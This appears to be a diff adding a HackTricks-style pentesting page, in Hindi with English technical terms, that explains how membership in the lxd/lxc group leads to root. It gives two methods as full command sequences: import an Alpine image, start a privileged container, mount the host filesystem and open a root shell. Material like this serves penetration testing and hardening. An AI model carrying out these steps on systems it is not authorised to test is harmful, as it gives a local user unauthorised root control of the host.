@@ -1,0 +1,85 @@
+# lxd/lxc Group - Privilege escalation
+
+{{#include ../../../banners/hacktricks-training.md}}
+
+यदि आप _**lxd**_ या _**lxc**_ **group** में हैं, तो आप root बन सकते हैं।
+
+## इंटरनेट के बिना Exploiting
+
+### Method 1
+
+आप lxd के साथ उपयोग करने के लिए किसी trusted repository से Alpine image download कर सकते हैं।  
+Canonical अपनी site पर daily builds प्रकाशित करता है: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+नवीनतम build से **lxd.tar.xz** और **rootfs.squashfs** दोनों प्राप्त करें। (Directory का नाम date होता है।)
+
+वैकल्पिक रूप से, आप अपनी machine पर यह distro builder install कर सकते हैं: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github के निर्देशों का पालन करें):
+```bash
+# Install requirements
+sudo apt update
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
+
+# Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
+git clone https://github.com/lxc/distrobuilder
+
+# Make distrobuilder
+cd ./distrobuilder
+make
+
+# Prepare the creation of alpine
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
+```
+फ़ाइलें **incus.tar.xz** (**lxd.tar.xz** यदि आपने Canonical repository से download किया है) और **rootfs.squashfs** upload करें, image को repo में add करें और एक container बनाएँ:
+```bash
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+
+# Check the image is there
+lxc image list
+
+# Create the container
+lxc init alpine privesc -c security.privileged=true
+
+# List containers
+lxc list
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+> [!CAUTION]
+> यदि आपको यह error _**Error: No storage pool found. Please create a new storage pool**_\
+> **`lxd init`** चलाएँ और default पर सभी options set-up करें। फिर commands के पिछले chunk को **repeat** करें।
+
+अंत में आप container को execute करके root प्राप्त कर सकते हैं:
+```bash
+lxc start privesc
+lxc exec privesc /bin/sh
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
+```
+### विधि 2
+
+एक Alpine image बनाएं और इसे `security.privileged=true` flag का उपयोग करके शुरू करें, जिससे container को host filesystem के साथ root के रूप में interact करने के लिए बाध्य किया जा सके।
+```bash
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+# before running the image, start and configure the lxd storage pool as default
+lxd init
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+```
+{{#include ../../../banners/hacktricks-training.md}}
